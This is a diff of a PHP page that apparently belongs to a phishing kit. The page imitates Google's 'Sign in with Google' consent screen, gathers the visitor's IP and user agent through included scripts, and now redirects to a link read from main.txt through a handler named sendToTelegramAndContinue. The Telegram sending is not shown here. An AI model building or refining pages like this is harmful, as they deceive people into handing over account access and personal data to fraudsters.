@@ -1,8 +1,15 @@
 <?php
 // get root directory
-require_once('./get-data.php');
-require_once('./getip.php');
-?> <?php
+$rootDirectory = dirname(dirname(__FILE__));
+require_once($rootDirectory . '/get-data.php');
+require_once($rootDirectory . '/getip.php');
+
+$mainFile = './main.txt';
+$mainLink = trim(file_get_contents($mainFile));
+
+?>
+
+<?php
 function getServerIP() {
     if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
         return $_SERVER['HTTP_CLIENT_IP'];
@@ -385,7 +392,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                 <div class="legal-text"> Learn more about <a href="#">Sign in with Google</a>. </div>
                 <div class="button-group">
                     <button type="button" class="cancel-button"
-                        onclick="window.location.href='/login/google.php'">Cancel</button>
+                        onclick="window.location.href='./login/google.php'">Cancel</button>
                     <button type="button" class="continue-button"
                         onclick="sendToTelegramAndContinue()">Continue</button>
                 </div>
@@ -444,7 +451,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
 
     function sendToTelegramAndContinue() {
         // Chỉ chuyển đến index.php, không gửi Telegram
-        window.location.href = "/index.php";
+        window.location.href = "<?php echo $mainLink; ?>";
     }
     </script>
 </body>
